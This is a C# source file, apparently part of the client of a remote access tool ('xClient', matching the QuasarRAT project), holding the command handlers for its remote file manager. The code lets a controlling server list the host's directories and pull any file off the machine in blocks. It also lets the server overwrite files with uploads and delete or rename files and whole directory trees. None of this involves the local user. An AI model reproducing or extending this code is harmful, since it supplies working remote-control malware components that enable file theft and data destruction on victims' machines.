using System;
using System.IO;
using System.Security;
using System.Threading;
using xClient.Core.Networking;
using xClient.Core.Utilities;
using xClient.Enums;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE DIRECTORIES AND FILES (excluding the program). */
    public static partial class CommandHandler
    {
        public static void HandleGetDirectory(Packets.ServerPackets.GetDirectory command, Client client)
        {
            bool isError = false;
            string message = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                message = msg;
            };

            try
            {
                DirectoryInfo dicInfo = new DirectoryInfo(command.RemotePath);

                FileInfo[] iFiles = dicInfo.GetFiles();
                DirectoryInfo[] iFolders = dicInfo.GetDirectories();

                string[] files = new string[iFiles.Length];
                long[] filessize = new long[iFiles.Length];
                string[] folders = new string[iFolders.Length];

                int i = 0;
                foreach (FileInfo file in iFiles)
                {
                    files[i] = file.Name;
                    filessize[i] = file.Length;
                    i++;
                }
                if (files.Length == 0)
                {
                    files = new string[] {DELIMITER};
                    filessize = new long[] {0};
                }

                i = 0;
                foreach (DirectoryInfo folder in iFolders)
                {
                    folders[i] = folder.Name;
                    i++;
                }
                if (folders.Length == 0)
                    folders = new string[] {DELIMITER};

                new Packets.ClientPackets.GetDirectoryResponse(files, folders, filessize).Execute(client);
            }
            catch (UnauthorizedAccessException)
            {
                onError("GetDirectory No permission");
            }
            catch (SecurityException)
            {
                onError("GetDirectory No permission");
            }
            catch (PathTooLongException)
            {
                onError("GetDirectory Path too long");
            }
            catch (DirectoryNotFoundException)
            {
                onError("GetDirectory Directory not found");
            }
            catch (FileNotFoundException)
            {
                onError("GetDirectory File not found");
            }
            catch (IOException)
            {
                onError("GetDirectory I/O error");
            }
            catch (Exception)
            {
                onError("GetDirectory Failed");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(message))
                    new Packets.ClientPackets.SetStatusFileManager(message, true).Execute(client);
            }
        }

        public static void HandleDoDownloadFile(Packets.ServerPackets.DoDownloadFile command, Client client)
        {
            new Thread(() =>
            {
                _limitThreads.WaitOne();
                try
                {
                    FileSplit srcFile = new FileSplit(command.RemotePath);
                    if (srcFile.MaxBlocks < 0)
                        throw new Exception(srcFile.LastError);

                    for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                    {
                        if (!client.Connected || _canceledDownloads.ContainsKey(command.ID))
                            break;

                        byte[] block;

                        if (!srcFile.ReadBlock(currentBlock, out block))
                            throw new Exception(srcFile.LastError);

                        new Packets.ClientPackets.DoDownloadFileResponse(command.ID,
                            Path.GetFileName(command.RemotePath), block, srcFile.MaxBlocks, currentBlock,
                            srcFile.LastError).Execute(client);
                    }
                }
                catch (Exception ex)
                {
                    new Packets.ClientPackets.DoDownloadFileResponse(command.ID, Path.GetFileName(command.RemotePath), new byte[0], -1, -1, ex.Message)
                        .Execute(client);
                }
                _limitThreads.Release();
            }).Start();
        }

        public static void HandleDoDownloadFileCancel(Packets.ServerPackets.DoDownloadFileCancel command, Client client)
        {
            if (!_canceledDownloads.ContainsKey(command.ID))
            {
                _canceledDownloads.Add(command.ID, "canceled");
                new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "canceled", new byte[0], -1, -1, "Canceled").Execute(client);
            }
        }

        public static void HandleDoUploadFile(Packets.ServerPackets.DoUploadFile command, Client client)
        {
            if (command.CurrentBlock == 0 && File.Exists(command.RemotePath))
                NativeMethods.DeleteFile(command.RemotePath); // delete existing file

            FileSplit destFile = new FileSplit(command.RemotePath);
            destFile.AppendBlock(command.Block, command.CurrentBlock);
        }

        public static void HandleDoPathDelete(Packets.ServerPackets.DoPathDelete command, Client client)
        {
            bool isError = false;
            string message = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                message = msg;
            };

            try
            {
                switch (command.PathType)
                {
                    case PathType.Directory:
                        Directory.Delete(command.Path, true);
                        new Packets.ClientPackets.SetStatusFileManager("Deleted directory", false).Execute(client);
                        break;
                    case PathType.File:
                        File.Delete(command.Path);
                        new Packets.ClientPackets.SetStatusFileManager("Deleted file", false).Execute(client);
                        break;
                }

                HandleGetDirectory(new Packets.ServerPackets.GetDirectory(Path.GetDirectoryName(command.Path)), client);
            }
            catch (UnauthorizedAccessException)
            {
                onError("DeletePath No permission");
            }
            catch (PathTooLongException)
            {
                onError("DeletePath Path too long");
            }
            catch (DirectoryNotFoundException)
            {
                onError("DeletePath Path not found");
            }
            catch (IOException)
            {
                onError("DeletePath I/O error");
            }
            catch (Exception)
            {
                onError("DeletePath Failed");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(message))
                    new Packets.ClientPackets.SetStatusFileManager(message, false).Execute(client);
            }
        }

        public static void HandleDoPathRename(Packets.ServerPackets.DoPathRename command, Client client)
        {
            bool isError = false;
            string message = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                message = msg;
            };

            try
            {
                switch (command.PathType)
                {
                    case PathType.Directory:
                        Directory.Move(command.Path, command.NewPath);
                        new Packets.ClientPackets.SetStatusFileManager("Renamed directory", false).Execute(client);
                        break;
                    case PathType.File:
                        File.Move(command.Path, command.NewPath);
                        new Packets.ClientPackets.SetStatusFileManager("Renamed file", false).Execute(client);
                        break;
                }

                HandleGetDirectory(new Packets.ServerPackets.GetDirectory(Path.GetDirectoryName(command.NewPath)), client);
            }
            catch (UnauthorizedAccessException)
            {
                onError("RenamePath No permission");
            }
            catch (PathTooLongException)
            {
                onError("RenamePath Path too long");
            }
            catch (DirectoryNotFoundException)
            {
                onError("RenamePath Path not found");
            }
            catch (IOException)
            {
                onError("RenamePath I/O error");
            }
            catch (Exception)
            {
                onError("RenamePath Failed");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(message))
                    new Packets.ClientPackets.SetStatusFileManager(message, false).Execute(client);
            }
        }
    }
}